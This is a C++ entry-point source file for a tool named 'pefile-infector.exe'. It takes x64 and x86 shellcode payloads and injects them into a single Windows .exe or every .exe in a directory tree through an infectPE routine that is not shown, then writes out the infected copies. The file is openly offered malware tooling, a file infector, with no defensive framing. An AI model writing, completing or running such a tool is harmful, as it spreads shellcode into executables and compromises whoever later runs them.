#include <argparse/argparse.hpp>
#include <iostream>
#include "pe.h"
#include "exception.h"
#include "infection.h"
#include "helpers.h"
#include <filesystem>

int main(const int argc, const char **argv) {
    argparse::ArgumentParser program("pefile-infector.exe");

    program.add_argument("-o", "--output")
            .required()
            .help("Specify the output file or directory.");
    auto &inputGroup = program.add_mutually_exclusive_group(true);
    // Force explicit directory to prevent accidental overwrite of clean files.
    inputGroup.add_argument("-i", "--input")
            .help("Specify the input file.");
    inputGroup.add_argument("-d", "--directory")
            .help("Specify the input directory.");
    program.add_argument("-px64", "--payload-x64")
            .required()
            .help("Specify the x64 shell payload file.");
    program.add_argument("-sx64", "--section-x64")
            .default_value(std::string(".text"))
            .required()
            .help("Specify the name of the section containing x64 shellcode.");
    program.add_argument("-px86", "--payload-x86")
            .required()
            .help("Specify the x86 shell payload file.");
    program.add_argument("-sx86", "--section-x86")
            .default_value(std::string(".text"))
            .required()
            .help("Specify the name of the section containing x86 shellcode.");

    try {
        program.parse_args(argc, argv);
    } catch (std::runtime_error &) {
        std::cerr << program.help().str() << std::endl;
        return 1;
    }

    bool directoryMode = program.is_used("--directory");

    std::vector<std::string> files{};
    try {
        if (!directoryMode) {
            auto input = program.get<std::string>("--input");
            if (!isFile(input)) {
                std::cerr << input + std::string(" is not a file.") << std::endl;
                return 1;
            }
            files.push_back(input);
        } else {
            auto input = program.get<std::string>("--directory");
            auto output = program.get<std::string>("--output");
            if (!isDirectory(input)) {
                throw Exception(input + std::string(" is not a directory."));
            }
            if (!isDirectory(output)) {
                throw Exception(output + std::string(" is not a directory."));
            }
            for (std::filesystem::recursive_directory_iterator iterator(input), end; iterator != end; iterator++) {
                if (!iterator->is_regular_file()) continue;
                auto path = iterator->path();
                auto extension = path.extension();
                if (extension.compare(std::string(".exe"))) continue;
                std::cout << path.string() << std::endl;
                files.push_back(path.string());
            }
        }
    } catch (Exception &e) {
        std::cerr << e.what() << std::endl;
        return 1;
    }

    auto outputPath = program.get<std::string>("--output");
    auto payload64Path = program.get<std::string>("--payload-x64");
    auto payload86Path = program.get<std::string>("--payload-x86");
    auto payload64SectionName = program.get<std::string>("--section-x64");
    auto payload86SectionName = program.get<std::string>("--section-x86");

    PE *target = nullptr;
    PE *payload64 = nullptr;
    PE *payload86 = nullptr;
    try {
        payload64 = new PE(payload64Path.c_str());
        payload86 = new PE(payload86Path.c_str());

        if (payload64->getFormat() != IMAGE_FORMAT_PE64) {
            throw Exception("Invalid PE32+ file.");
        }

        if (payload86->getFormat() != IMAGE_FORMAT_PE32) {
            throw Exception("Invalid PE32 file.");
        }

        for (auto &file: files) {
            target = new PE(file.c_str());
            infectPE(*target, *payload86, *payload64, payload86SectionName, payload64SectionName);
            if (directoryMode) {
                std::filesystem::path inputDirectory = program.get<std::string>("--directory");
                std::filesystem::path outputDirectory = program.get<std::string>("--output");
                auto relPath = std::filesystem::relative(file, inputDirectory);
                auto relOutput = outputDirectory / relPath;
                std::filesystem::create_directories(relOutput.parent_path());
                target->save(relOutput.string().c_str());
            } else {
                target->save(outputPath.c_str());
            }
            target->destroy();
        }
    } catch (Exception &e) {
        if (target) target->destroyAndFree();
        if (payload86) payload86->destroyAndFree();
        if (payload64) payload64->destroyAndFree();
        std::cout << "Failure to load/parse PE file: " + std::string(e.what()) << std::endl;
        return 1;
    }

    if (target) target->destroyAndFree();
    payload86->destroyAndFree();
    payload64->destroyAndFree();
    std::cout << "Infect successful." << std::endl;
    return 0;
}
